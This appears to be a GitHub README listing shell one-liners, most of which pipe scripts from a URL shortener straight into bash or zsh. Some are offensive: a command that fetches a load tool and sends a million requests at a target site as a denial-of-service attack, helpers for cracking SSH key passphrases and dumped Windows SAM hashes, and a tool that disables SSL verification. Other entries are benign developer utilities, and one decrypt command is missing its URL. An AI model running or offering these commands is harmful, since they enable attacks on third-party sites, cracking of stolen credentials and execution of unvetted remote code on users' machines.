# Magic oneliners

This repository is about bash/python/programming language oneliners that can do an incredible amount of work.

## Oneliners

* [Crack a ssh private key](https://raw.githubusercontent.com/4thel00z/oneliners/master/scripts/crack_ssh_password.zsh)

```
# Download via: 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/crackssh | zsh -s <path-to-private-key> <path-to-wordlist> 

# or in case you haven't installed zsh yet or use fish 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/crackssh | bash -s <path-to-private-key> <path-to-wordlist> 
```

* [Setup a cool go project template](https://github.com/4thel00z/d)

```
# Ideally you do this in your ~/go/src/github.com/<your-gihub-username>/ or other smart places
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/boilerplate | bash -s <project_name>
```

* [DOS a webpage](http://gendos.site)

```
# What this does, is it downloads https://github.com/rakyll/hey for amd64 linux and shoots against the 'target.com'
curl -L "gendos.site?args=https://target.com%20-n=1000000" | sh
```

* [Upload encrypted stuff to your gist](https://shortly.fun/upload-gist)

First create a github token [here](https://github.com/settings/tokens/new) if you haven't already used `hub login`.

```
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/upload-gist | zsh -s <path-to-file> <name-of-gpg-recipient> [optional: <github-token-with-gist-permissions>]
```

* Decrypt those gists again :D

```
curl  --proto '=https' --tlsv1.2 -L -sSf  | base64 -d | gpg --decrypt
```

* [Crack sam_hashes](https://shortly.fun/cracksam)

If you have successfully dumped hashes from the sam database of a Windows target and stored them to a file you can use the following scrip to retrieve the cleartext passwords:

```
# Download via: 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/cracksam | zsh -s <absolute-path-to-hashes> <absolute-path-to-wordlist>

# or in case you haven't installed zsh yet or use fish 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/cracksam | bash -s <absolute-path-to-hashes> <absolute-path-to-wordlist>
```


* [Disable ssl verification](https://shortly.fun/no-ssl-verification)

If you want to disable ssl verification for a software which uses openssl or gnutls as a shared library you can do the following:
```
# Download via: 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/no-ssl-verification | zsh -s <some-command-you-want-to-disable-ssl-verification-for>

# or in case you haven't installed zsh yet or use fish 
curl  --proto '=https' --tlsv1.2 -L -sSf https://shortly.fun/no-ssl-verification | bash -s <some-command-you-want-to-disable-ssl-verification-for>
```


* [Generate a report](https://github.com/4thel00z/reportgen)

In case you are a l33t h4x0r who wants to render the nicest OSCP pentesting report or some boring stuff documentation for your newest JS hipster framework with 666 stars you can use the following command on a markdown that looks like [this](https://raw.githubusercontent.com/4thel00z/reportgen/master/example.md):

```
curl  --proto '=https' --tlsv1.2 -L -sSf  https://shortly.fun/genreport  | zsh -s example.md example.pdf
```

* [Open url in wayback machine (private firefox window)](https://shortly.fun/wayback)

In case you want to check for a url in a private firefox window in the [Wayback machine](https://archive.org/) you can use the following script:

```
curl  --proto '=https' --tlsv1.2 -L -sSf  https://shortly.fun/wayback  | zsh -s https://example.com
```

* Debugging postgres - Find longrunning queries

If you are debugging your postgres instance and have [pgcli](https://github.com/dbcli/pgcli) installed, you can find out which query it is via:
You will have to have `$DB_HOST`, `$DB_USERNAME` and `$DB_NAME` set appropriately.

```
echo "WITH long_running AS (SELECT pid, now() - pg_stat_activity.query_start AS duration, query, state FROM pg_stat_activity WHERE (now() - pg_stat_activity.query_start) > interval '1 minutes' and state = 'active') SELECT * from long_running;"| pgcli -h $DB_HOST -U $DB_USERNAME -d $DB_NAME 
```

* Login docker to point to your private ecr registry

```
export REGION=eu-central-1; aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin $(aws sts get-caller-identity --query Account --output text).dkr.ecr.$REGION.amazonaws.com

```
## License

This project is licensed under the GPL-3 license.
